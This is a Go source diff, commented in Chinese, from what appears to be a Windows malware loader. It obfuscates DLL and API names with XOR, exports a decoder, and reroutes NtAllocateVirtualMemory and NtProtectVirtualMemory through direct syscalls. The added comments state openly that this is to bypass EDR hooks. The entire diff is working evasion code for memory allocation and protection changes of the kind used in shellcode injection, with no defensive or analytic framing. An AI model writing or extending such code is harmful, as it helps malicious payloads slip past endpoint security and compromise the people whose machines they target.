@@ -12,7 +12,7 @@ func deriveKey(baseKey byte, offset int) byte {
 	return (baseKey + byte(offset)*0x13) ^ 0x55
 }
 
-// 基础解密 — 简单XOR（所有加密数据使用此格式）
+// 基础解密 — 简单XOR
 func xorDec(data []byte, key byte) string {
 	out := make([]byte, len(data))
 	for i, b := range data {
@@ -21,7 +21,7 @@ func xorDec(data []byte, key byte) string {
 	return string(out)
 }
 
-// 多层解密：轮询XOR + 位旋转（高级用，需配套加密）
+// 多层解密：轮询XOR + 位旋转
 func multiDec(data []byte, baseKey byte) string {
 	out := make([]byte, len(data))
 	for i, b := range data {
@@ -32,6 +32,11 @@ func multiDec(data []byte, baseKey byte) string {
 }
 
 const xk byte = 0x7F
+
+// XorDecPub 公开的XOR解密函数，供其他包使用
+func XorDecPub(data []byte) string {
+	return xorDec(data, xk)
+}
 
 // 加密的DLL名（XOR 0x7F）
 var (
@@ -57,7 +62,7 @@ var (
 	encECW  = []byte{0x3A, 0x11, 0x0A, 0x12, 0x3C, 0x17, 0x16, 0x13, 0x1B, 0x28, 0x16, 0x11, 0x1B, 0x10, 0x08, 0x0C}
 )
 
-// ntProc 解析ntdll API
+// ntProc 解析ntdll API (保留供非关键路径回退使用)
 func ntProc(encName []byte) *syscall.LazyProc {
 	return syscall.NewLazyDLL(xorDec(encNtDll, xk)).NewProc(xorDec(encName, xk))
 }
@@ -72,14 +77,21 @@ func u32Proc(encName []byte) *syscall.LazyProc {
 	return syscall.NewLazyDLL(xorDec(encU32Dll, xk)).NewProc(xorDec(encName, xk))
 }
 
-// CallNtAVM 调用NtAllocateVirtualMemory
+// CallNtAVM 调用NtAllocateVirtualMemory — 优先直接syscall绕过EDR hook
 func CallNtAVM(hProcess uintptr, baseAddr *uintptr, regionSize *uintptr, allocType uintptr, protect uintptr) uintptr {
+	if SSNMap != nil {
+		return DirectNtAVM(hProcess, baseAddr, regionSize, allocType, protect)
+	}
+	// 回退: LazyDLL路径 (SSN解析失败时)
 	ret, _, _ := ntProc(encNAVM).Call(hProcess, uintptr(unsafe.Pointer(baseAddr)), 0, uintptr(unsafe.Pointer(regionSize)), allocType, protect)
 	return ret
 }
 
-// CallNtPVM 调用NtProtectVirtualMemory
+// CallNtPVM 调用NtProtectVirtualMemory — 优先直接syscall绕过EDR hook
 func CallNtPVM(hProcess uintptr, baseAddr *uintptr, regionSize *uintptr, newProtect uintptr, oldProtect *uint32) uintptr {
+	if SSNMap != nil {
+		return DirectNtPVM(hProcess, baseAddr, regionSize, newProtect, oldProtect)
+	}
 	ret, _, _ := ntProc(encNPVM).Call(hProcess, uintptr(unsafe.Pointer(baseAddr)), uintptr(unsafe.Pointer(regionSize)), newProtect, uintptr(unsafe.Pointer(oldProtect)))
 	return ret
 }
